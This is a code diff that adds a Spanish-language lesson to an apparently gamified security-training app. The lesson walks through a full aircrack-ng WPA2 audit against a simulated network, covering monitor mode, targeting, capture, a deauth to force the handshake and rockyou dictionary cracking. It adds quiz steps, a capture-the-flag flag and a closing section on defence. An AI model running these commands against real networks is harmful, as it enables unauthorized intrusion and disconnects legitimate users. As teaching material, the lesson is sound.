@@ -1573,6 +1573,121 @@ export const LESSONS: Lesson[] = [
       },
     ],
   },
+  {
+    id: "l-eng-wifi",
+    title: "ENGAGEMENT: romper una WiFi WPA2 (con permiso)",
+    level: "avanzado",
+    summary:
+      "La operación WiFi completa: modo monitor, escuchar el aire, capturar el handshake con un deauth y crackearlo con diccionario.",
+    concept:
+      "Una auditoría de WiFi de punta a punta, la cadena real de aircrack-ng. El orden: (1) poner la placa en modo monitor, (2) escuchar el aire y elegir objetivo, (3) capturar el 'handshake' (el saludo cifrado que se manda al conectarse), (4) forzarlo con un deauth, (5) crackearlo con un diccionario. IMPORTANTE: esto es solo en TU red o con permiso explícito por escrito.",
+    reward: { xp: 320, coins: 260 },
+    steps: [
+      {
+        explain:
+          "Paso 1 — MODO MONITOR. Una placa WiFi normal solo escucha lo suyo. El modo monitor la pone a 'oír todo el aire'. Activalo sobre wlan0.",
+        task: "Activá el monitor: airmon-ng start wlan0",
+        hints: ["Escribí: airmon-ng start wlan0"],
+        hint: "Escribí: airmon-ng start wlan0",
+        check: (cmd, out) =>
+          usedTool(cmd, "airmon-ng") && /monitor/i.test(out) && /wlan0mon/.test(out),
+        debrief:
+          "Listo: se creó la interfaz wlan0mon en modo monitor. Ahora podés capturar el tráfico de redes ajenas que pasa por el aire (no su contenido cifrado, pero sí los 'saludos').",
+      },
+      {
+        explain:
+          "Paso 2 — ESCUCHAR EL AIRE. Escaneá las redes cercanas para elegir objetivo. Vas a ver su BSSID (la 'MAC' del router), canal, cifrado y nombre.",
+        task: "Escaneá: airodump-ng wlan0mon",
+        hints: ["Escribí: airodump-ng wlan0mon"],
+        hint: "Escribí: airodump-ng wlan0mon",
+        check: (cmd, out) =>
+          usedTool(cmd, "airodump-ng") && /Vecino-2G/.test(out) && /E8:94:F6:77:88:04/.test(out),
+        debrief:
+          "Varias redes. El objetivo autorizado es Vecino-2G (BSSID E8:94:F6:77:88:04), WPA2, en el canal 6. Ojo: hay redes WPA3 (Corp-Secure) — esas NO caen con diccionario offline.",
+      },
+      {
+        explain: "Mirá la tabla de redes y respondé.",
+        task: "Respondé con 'responder ...'",
+        hint: "En la fila de Vecino-2G, la columna CH es el canal.",
+        question: "¿En qué canal (CH) está la red Vecino-2G?",
+        answers: ["6", "canal 6", "ch 6"],
+        answerContains: true,
+        debrief: "Canal 6. Hay que fijar la escucha a ESE canal para no perder el handshake.",
+      },
+      {
+        explain:
+          "Paso 3 — CAPTURAR. Enfocá la escucha en el objetivo y su canal, y grabá a un archivo con -w. Ahí va a caer el handshake cuando alguien se conecte.",
+        task:
+          "Capturá: airodump-ng --bssid E8:94:F6:77:88:04 -c 6 -w captura wlan0mon",
+        hints: [
+          "--bssid fija el router, -c el canal, -w el archivo de captura.",
+          "airodump-ng --bssid E8:94:F6:77:88:04 -c 6 -w captura wlan0mon",
+        ],
+        hint: "airodump-ng --bssid E8:94:F6:77:88:04 -c 6 -w captura wlan0mon",
+        check: (cmd, out) =>
+          usedTool(cmd, "airodump-ng") && /Vecino-2G/.test(out) && /(Escuchando|captura)/i.test(out),
+        debrief:
+          "Estás grabando el tráfico de Vecino-2G en captura-01.cap. Hay un cliente conectado: si lo echamos un instante, al reconectarse va a repetir el handshake y lo atrapamos.",
+      },
+      {
+        explain:
+          "Paso 4 — FORZAR EL HANDSHAKE. Un 'deauth' expulsa un momento al cliente conectado; al volver, repite el saludo (handshake) y tu captura lo agarra.",
+        task: "Forzá el handshake: aireplay-ng --deauth 5 -a E8:94:F6:77:88:04 wlan0mon",
+        hints: [
+          "--deauth manda paquetes de desautenticación; -a es el BSSID objetivo.",
+          "aireplay-ng --deauth 5 -a E8:94:F6:77:88:04 wlan0mon",
+        ],
+        hint: "aireplay-ng --deauth 5 -a E8:94:F6:77:88:04 wlan0mon",
+        check: (cmd, out) =>
+          usedTool(cmd, "aireplay-ng") && /handshake/i.test(out) && /capturad/i.test(out),
+        debrief:
+          "¡Handshake capturado! Ese saludo contiene una prueba matemática de la contraseña (no la contraseña en sí). Ahora hay que adivinarla probando un diccionario contra esa prueba.",
+      },
+      {
+        explain: "Pensá para qué sirvió el deauth y respondé.",
+        task: "Respondé con 'responder ...'",
+        hint: "El cliente se desconecta y, al volver, repite el ___ que querés capturar.",
+        question: "¿Para qué mandaste el deauth?",
+        answers: ["handshake", "capturar el handshake", "forzar el handshake", "para el handshake", "reconecte", "reconectar"],
+        answerContains: true,
+        debrief: "Exacto: para forzar el handshake. Sin cliente que se reconecte, habría que esperar a que alguien entre solo.",
+      },
+      {
+        explain:
+          "Paso 5 — CRACKEAR. Probá un diccionario de contraseñas contra el handshake capturado. Si la clave es débil y está en la lista, cae.",
+        task: "Crackeá: aircrack-ng -w rockyou.txt captura-01.cap",
+        hints: [
+          "-w es el diccionario (rockyou.txt), y al final el archivo .cap con el handshake.",
+          "aircrack-ng -w rockyou.txt captura-01.cap",
+        ],
+        hint: "aircrack-ng -w rockyou.txt captura-01.cap",
+        check: (_cmd, out) =>
+          out.includes("ND{wifi_wpa_crackeada}") || /KEY FOUND/i.test(out),
+        debrief:
+          "KEY FOUND: la clave era débil y estaba en el diccionario (bandera ND{wifi_wpa_crackeada}). Aircrack no 'adivina en vivo': prueba el diccionario contra la prueba matemática del handshake, offline.",
+      },
+      {
+        explain: "Leé el resultado de aircrack y respondé.",
+        task: "Respondé con 'responder ...'",
+        hint: "Está entre corchetes: KEY FOUND! [ ... ].",
+        question: "¿Cuál era la contraseña de la WiFi Vecino-2G?",
+        answers: ["invitado"],
+        answerContains: true,
+        debrief: "‘invitado’: corta y común, justo lo que un diccionario prueba primero.",
+      },
+      {
+        explain:
+          "Cierre — DEFENSA. Todo esto funcionó porque la clave era débil. Dos cosas la habrían salvado.",
+        task: "Respondé con 'responder ...'",
+        hint: "El estándar nuevo que resiste el diccionario offline se llama WPA___ (un número).",
+        question: "¿Qué estándar WiFi NO cae ante este ataque de diccionario offline?",
+        answers: ["wpa3", "wpa 3", "3"],
+        answerContains: true,
+        debrief:
+          "WPA3: su handshake (SAE) no se puede probar offline como WPA2. Y en cualquier caso, una frase larga y única deja el diccionario inútil. Cerraste una operación WiFi completa: monitor → escucha → captura → deauth → crackeo. Recordá: SOLO en tu red o con permiso escrito; hacerlo en una red ajena es delito.",
+      },
+    ],
+  },
 ];
 
 /** Motor de lecciones: mantiene el paso actual de la lección activa. */
